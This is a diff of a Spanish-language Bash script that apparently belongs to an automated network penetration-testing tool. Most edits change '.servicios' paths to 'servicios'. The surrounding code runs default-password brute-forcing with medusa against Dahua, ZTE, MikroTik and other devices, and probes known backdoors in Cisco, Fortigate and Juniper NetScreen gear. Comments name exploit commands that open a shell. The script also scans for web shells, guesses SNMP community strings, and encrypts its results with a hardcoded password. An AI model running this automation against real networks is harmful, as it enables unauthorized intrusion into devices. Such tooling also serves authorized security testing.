-if [ -f .servicios/zimbra.txt ]
+if [ -f servicios/zimbra.txt ]
 then
-	echo -e "$OKBLUE #################### zimbra (`wc -l .servicios/zimbra.txt`) ######################$RESET"	    	
+	echo -e "$OKBLUE #################### zimbra (`wc -l servicios/zimbra.txt`) ######################$RESET"	    	
 	while read line
 	do     						
 		ip=`echo $line | cut -f1 -d":"`
@@ -3368,16 +3377,16 @@ then
 		
 		grep -i "credenciales" logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt  > .vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 															
 		 echo ""
- 	done <.servicios/zimbra.txt
+ 	done <servicios/zimbra.txt
 	#insert clean data	
 	insert_data	
 fi
 
 
 #cisco
-if [ -f .servicios/ciscoASA.txt ]
+if [ -f servicios/ciscoASA.txt ]
 then
-	echo -e "$OKBLUE #################### cisco (`wc -l .servicios/ciscoASA.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### cisco (`wc -l servicios/ciscoASA.txt`) ######################$RESET"	    
 	while read ip       
 	do     						
 		echo -e "[+] Escaneando $ip:443"		
@@ -3390,15 +3399,15 @@ then
 		#grep "|" logs/vulnerabilidades/"$ip"_cisco-dos.txt  > .vulnerabilidades/"$ip"_cisco-dos.txt
 													 
 		 echo ""
- 	done <.servicios/ciscoASA.txt
+ 	done <servicios/ciscoASA.txt
 	#insert clean data	
 	insert_data	
 fi
 
 #cisco
-if [ -f .servicios/cisco.txt ]
+if [ -f servicios/cisco.txt ]
 then
-	echo -e "$OKBLUE #################### cisco (`wc -l .servicios/cisco.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### cisco (`wc -l servicios/cisco.txt`) ######################$RESET"	    
 	while read ip       
 	do     						
 		echo -e "[+] Escaneando $ip"
@@ -3432,16 +3441,16 @@ then
 			fi					
 		fi								
 		echo ""													 		
- 	done <.servicios/cisco.txt
+ 	done <servicios/cisco.txt
 	#insert clean data	
 	insert_data	
 fi
 
 
 #samba
-if [ -f .servicios/samba.txt ]
+if [ -f servicios/samba.txt ]
 then
-	echo -e "$OKBLUE #################### samba (`wc -l .servicios/samba.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### samba (`wc -l servicios/samba.txt`) ######################$RESET"	    
 	while read ip       
 	do     						
 		echo -e "[+] Escaneando $ip:445"		
@@ -3450,15 +3459,15 @@ then
 		grep "|" logs/vulnerabilidades/"$ip"_445_sambaVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_445_sambaVuln.txt
 		#scanner/smb/smb_uninit_cred											 
 		 echo ""
- 	done <.servicios/samba.txt
+ 	done <servicios/samba.txt
 	#insert clean data	
 	insert_data	
 fi
 
 #RomPager
-if [ -f .servicios/RomPager.txt ]
+if [ -f servicios/RomPager.txt ]
 then
-	echo -e "$OKBLUE #################### RomPager (`wc -l .servicios/RomPager.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### RomPager (`wc -l servicios/RomPager.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip:80"	
@@ -3467,7 +3476,7 @@ then
 		grep --color=never "bimqODoXWaTzdFnh" logs/vulnerabilidades/"$ip"_80_misfortune.txt > .vulnerabilidades/"$ip"_80_misfortune.txt 2>/dev/null 
 													 
 		 echo ""
- 	done <.servicios/RomPager.txt
+ 	done <servicios/RomPager.txt
 	#insert clean data	
 	insert_data	
 	
@@ -3478,9 +3487,9 @@ fi
 
 # cisco backdoor
 
-if [ -f .servicios/backdoor32764.txt ]
+if [ -f servicios/backdoor32764.txt ]
 then
-	echo -e "$OKBLUE #################### Cisco linksys WAG200G backdoor (`wc -l .servicios/backdoor32764.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### Cisco linksys WAG200G backdoor (`wc -l servicios/backdoor32764.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip:32764"	
@@ -3495,7 +3504,7 @@ then
 		# backdoor32764.py --ip 192.168.0.1 --shell
 
 		 echo ""
- 	done <.servicios/backdoor32764.txt
+ 	done <servicios/backdoor32764.txt
 	#insert clean data	
 	insert_data	
 fi
@@ -3503,9 +3512,9 @@ fi
 
 # fortigate backdoor
 
-if [ -f .servicios/fortinet.txt ]
+if [ -f servicios/fortinet.txt ]
 then
-	echo -e "$OKBLUE #################### fortinet (`wc -l .servicios/fortinet.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### fortinet (`wc -l servicios/fortinet.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"		
@@ -3557,7 +3566,7 @@ then
 		fi					
 						
 		 echo ""
- 	done <.servicios/fortinet.txt
+ 	done <servicios/fortinet.txt
 	#exploit 
 	# cd /opt/backdoors/
 	# python fortigate.py 192.168.0.1
@@ -3567,9 +3576,9 @@ then
 fi
 
 # Juniper 
-if [ -f .servicios/NetScreen.txt ]
+if [ -f servicios/NetScreen.txt ]
 then
-	echo -e "$OKBLUE #################### NetScreen - Juniper (`wc -l .servicios/NetScreen.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### NetScreen - Juniper (`wc -l servicios/NetScreen.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"
@@ -3643,7 +3652,7 @@ then
 					
 		
 		echo ""
- 	done <.servicios/NetScreen.txt
+ 	done <servicios/NetScreen.txt
 	#exploit 
 	# ssh root@192.168.0.1  pass=<<< %s(un='%s') = %u	
 	#insert clean data	
@@ -3651,9 +3660,9 @@ then
 fi
 
 # zyxel default password
-if [ -f .servicios/zyxel.txt ]
+if [ -f servicios/zyxel.txt ]
 then
-	echo -e "$OKBLUE #################### zyxel (`wc -l .servicios/zyxel.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### zyxel (`wc -l servicios/zyxel.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3688,15 +3697,15 @@ then
 		fi					
 									
 		echo ""
- 	done <.servicios/zyxel.txt	
+ 	done <servicios/zyxel.txt	
 	insert_data
 fi
 
 
 # mikrotik default password
-if [ -f .servicios/mikrotik.txt ]
+if [ -f servicios/mikrotik.txt ]
 then
-	echo -e "$OKBLUE #################### mikrotik (`wc -l .servicios/mikrotik.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### mikrotik (`wc -l servicios/mikrotik.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3727,14 +3736,14 @@ then
 		fi					
 						
 		echo ""
- 	done <.servicios/mikrotik.txt	
+ 	done <servicios/mikrotik.txt	
 	insert_data
 fi
 
 # ubiquiti default password
-if [ -f .servicios/ubiquiti.txt ]
+if [ -f servicios/ubiquiti.txt ]
 then
-	echo -e "$OKBLUE #################### ubiquiti (`wc -l .servicios/ubiquiti.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### ubiquiti (`wc -l servicios/ubiquiti.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3768,15 +3777,15 @@ then
 		fi					
 						
 		echo ""
- 	done <.servicios/ubiquiti.txt	
+ 	done <servicios/ubiquiti.txt	
 	insert_data
 fi
 
 
 # dahua default password
-if [ -f .servicios/dahua.txt ]
+if [ -f servicios/dahua.txt ]
 then
-	echo -e "$OKBLUE #################### dahua (`wc -l .servicios/dahua.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### dahua (`wc -l servicios/dahua.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3786,7 +3795,7 @@ then
 			medusa -u root -p vizxv -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDahua.txt 2>/dev/null			
 			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDahua.txt > .vulnerabilidades/"$ip"_23_passwordDahua.txt 					
 			#grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_password.txt 2>/dev/null > .vulnerabilidades/"$ip"_23_password.txt		
- 	done <.servicios/dahua.txt	
+ 	done <servicios/dahua.txt	
 	insert_data
 fi
 
@@ -3794,9 +3803,9 @@ fi
 		
 			
 # pfsense default password
-if [ -f .servicios/pfsense.txt ]
+if [ -f servicios/pfsense.txt ]
 then
-	echo -e "$OKBLUE #################### pfsense (`wc -l .servicios/pfsense.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### pfsense (`wc -l servicios/pfsense.txt`) ######################$RESET"	    
 	while read line     
 	do     						
 		echo -e "[+] Escaneando $line"	
@@ -3816,14 +3825,14 @@ then
 		fi					
 						
 		echo ""
- 	done <.servicios/pfsense.txt	
+ 	done <servicios/pfsense.txt	
 	insert_data
 fi
 
 # JBOSS
-if [ -f .servicios/jboss.txt ]
+if [ -f servicios/jboss.txt ]
 then
-	echo -e "$OKBLUE #################### jboss (`wc -l .servicios/jboss.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### jboss (`wc -l servicios/jboss.txt`) ######################$RESET"	    
 	while read line
 	do     						
 		ip=`echo $line | cut -f1 -d":"`
@@ -3840,15 +3849,15 @@ then
 						
 		egrep --color=never "VULNERABLE|EXPOSED|INCONCLUSIVE" logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt > .vulnerabilidades/"$ip"_"$port"_jbossVuln.txt
 		echo ""
- 	done <.servicios/jboss.txt	
+ 	done <servicios/jboss.txt	
 	insert_data
 fi
 
 
 # Netgear default password
-if [ -f .servicios/Netgear.txt ]
+if [ -f servicios/Netgear.txt ]
 then
-	echo -e "$OKBLUE #################### Netgear (`wc -l .servicios/Netgear.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### Netgear (`wc -l servicios/Netgear.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3885,15 +3894,15 @@ then
 				
 		
 		echo ""
- 	done <.servicios/Netgear.txt	
+ 	done <servicios/Netgear.txt	
 	insert_data
 fi
 
 
 # linksys default password
-if [ -f .servicios/linksys.txt ]
+if [ -f servicios/linksys.txt ]
 then
-	echo -e "$OKBLUE #################### linksys (`wc -l .servicios/linksys.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### linksys (`wc -l servicios/linksys.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3930,16 +3939,16 @@ then
 		fi					
 						
 		echo ""
- 	done <.servicios/linksys.txt	
+ 	done <servicios/linksys.txt	
 	insert_data
 fi
 
 
 
 # d-link default password
-if [ -f .servicios/d-link.txt ]
+if [ -f servicios/d-link.txt ]
 then
-	echo -e "$OKBLUE #################### d-link (`wc -l .servicios/d-link.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### d-link (`wc -l servicios/d-link.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -3978,16 +3987,16 @@ then
 				
 		
 		echo ""
- 	done <.servicios/d-link.txt	
+ 	done <servicios/d-link.txt	
 	insert_data
 fi
 
 
 
 # tp-link default password
-if [ -f .servicios/tp-link.txt ]
+if [ -f servicios/tp-link.txt ]
 then
-	echo -e "$OKBLUE #################### tp-link (`wc -l .servicios/tp-link.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### tp-link (`wc -l servicios/tp-link.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -4018,15 +4027,15 @@ then
 		fi					
 						
 		echo ""
- 	done <.servicios/tp-link.txt	
+ 	done <servicios/tp-link.txt	
 	insert_data
 fi
 
 
 # ZTE default password
-if [ -f .servicios/ZTE.txt ]
+if [ -f servicios/ZTE.txt ]
 then
-	echo -e "$OKBLUE #################### ZTE (`wc -l .servicios/ZTE.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### ZTE (`wc -l servicios/ZTE.txt`) ######################$RESET"	    
 	while read ip     
 	do     						
 		echo -e "[+] Escaneando $ip"	
@@ -4083,21 +4092,21 @@ then
 		fi					
 						
 		echo ""
- 	done <.servicios/ZTE.txt
+ 	done <servicios/ZTE.txt
 	
 	insert_data
 fi
 
-cat .servicios/snmp2.txt .servicios/linksys.txt .servicios/Netgear.txt .servicios/pfsense.txt .servicios/ubiquiti.txt .servicios/mikrotik.txt .servicios/NetScreen.txt  .servicios/fortinet.txt .servicios/cisco.txt  .servicios/ciscoASA.txt .servicios/3com.txt 2>/dev/null | sort | uniq > .servicios/snmp.txt; rm .servicios/snmp2.txt  2>/dev/null
-find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # borrar archivos vacios
+cat servicios/snmp2.txt servicios/linksys.txt servicios/Netgear.txt servicios/pfsense.txt servicios/ubiquiti.txt servicios/mikrotik.txt servicios/NetScreen.txt  servicios/fortinet.txt servicios/cisco.txt  servicios/ciscoASA.txt servicios/3com.txt 2>/dev/null | sort | uniq > servicios/snmp.txt; rm servicios/snmp2.txt  2>/dev/null
+find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # borrar archivos vacios
 
-if [ -f .servicios/snmp.txt ]
+if [ -f servicios/snmp.txt ]
 then
-	echo -e "$OKBLUE #################### SNMP (`wc -l .servicios/snmp.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### SNMP (`wc -l servicios/snmp.txt`) ######################$RESET"	    
 	
 	echo -e "[+] Escaneando $ip"
 	echo -e "\t[+] Probando comunity string comunes"
-	onesixtyone -c /usr/share/lanscanner/community.txt -i .servicios/snmp.txt > .enumeracion2/dispositivos-snmp2.txt
+	onesixtyone -c /usr/share/lanscanner/community.txt -i servicios/snmp.txt > .enumeracion2/dispositivos-snmp2.txt
 	sed 's/] 1/] \n1/g' -i .enumeracion2/dispositivos-snmp2.txt	# corregir error de onesixtyone
 	cat .enumeracion2/dispositivos-snmp2.txt | grep --color=never "\[" | sed 's/ \[/~/g' |  sed 's/\] /~/g' | sort | sort | uniq > .enumeracion2/dispositivos-snmp.txt
 	
@@ -4207,12 +4216,12 @@ for line in $(cat .enumeracion2/*webdirectorios.txt 2>/dev/null); do
 					echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path)" 
 					web-buster.pl -t $ip -p $port -h 8 -d "/$path/" -m directorios >> logs/enumeracion/"$ip"_"$port"_webdirectorios2.txt &
 										
-					web-buster.pl -t $ip -p $port -h 3 -d "/$path/" -m archivosPeligrosos >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt &
+					web-buster.pl -t $ip -p $port -h 3 -d "/$path/" -m archivosPeligrosos -o 0 | egrep --color=never "^200" >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt &
 	
 					egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
 					greprc=$?				
 					if [[ $greprc -eq 0 ]];then # si el banner es Apache
-						web-buster.pl -t $ip -p $port -h 3 -d "/$path/" -m backdoorApache >> .vulnerabilidades/"$ip"_"$port"_webshell.txt &
+						web-buster.pl -t $ip -p $port -h 3 -d "/$path/" -m backdoorApache  -o 0 | egrep --color=never "^200"  >> .vulnerabilidades/"$ip"_"$port"_webshell.txt &
 					fi	
 				else
 					echo -e "\t[-] No vale la pena escanear este directorio "
@@ -4419,7 +4428,7 @@ for archivo in `ls logs/enumeracion/*_divulgacionInformacion.txt 2>/dev/null;`; 
 			echo -e "[+] Posible archivo PhpInfo ($url)" 
 			phpinfo.pl -url "\"$url\"" >> logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null	
 			
-			egrep -iq "$url No es un archivo PHPinfo" logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
+			egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
 			greprc=$?
 			if [[ $greprc -eq 1 ]] ; then													
 				echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
@@ -4444,11 +4453,11 @@ echo "spool `pwd`/metasploit/IP-enum.txt" > command-metasploit.txt
 echo "setg SESSION X" >> command-metasploit.txt
 echo "resource /usr/share/lanscanner/postExploiter/enum.rc" >> command-metasploit.txt
 
-if [ -f .servicios/admin-web.txt ]
+if [ -f servicios/admin-web.txt ]
 then
 	
 	echo -e "$OKBLUE [i] Identificando paneles de administracion $RESET"
-	for line in $(cat .servicios/admin-web.txt); do
+	for line in $(cat servicios/admin-web.txt); do
 		echo -e "\n\t########### $line #######"		
 		####### Identificar tipo de panel de admin
 		ip_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80			
@@ -4464,7 +4473,7 @@ then
 			#https://181.115.188.36:443/wp-login.php   
 			line=`echo "${line/wp-login.php/}"`				
 		fi
-		echo "$line;$result" >> .servicios/admin-web2.txt	
+		echo "$line;$result" >> servicios/admin-web2.txt	
 		
 		if [[ ${path} != *"."* && ${result} != *"index of"* ]];then  # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
 			egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|webadmin|owa" # solo el segundo egrep poner "-q"
@@ -4482,11 +4491,16 @@ then
 		fi # Es directorio								
 	done		
 fi		
-sort .servicios/admin-web2.txt 2>/dev/null | uniq > .servicios/admin-web.txt 
-rm .servicios/admin-web2.txt 2>/dev/null
+sort servicios/admin-web2.txt 2>/dev/null | uniq > servicios/admin-web.txt 
+rm servicios/admin-web2.txt 2>/dev/null
 insert_data			
 
 
-echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
-grep -ira "timed out" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed"
-grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed"
+#echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
+#grep -ira "timed out" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed" >> errores.log
+#grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed" >> errores.log
+
+#Encritar resultados
+7z a .resultados.7z .resultados.db -pcANRHPeREPZsCYGB8L64 >/dev/null
+rm .resultados.db
+rm .vulnerabilidades2/*
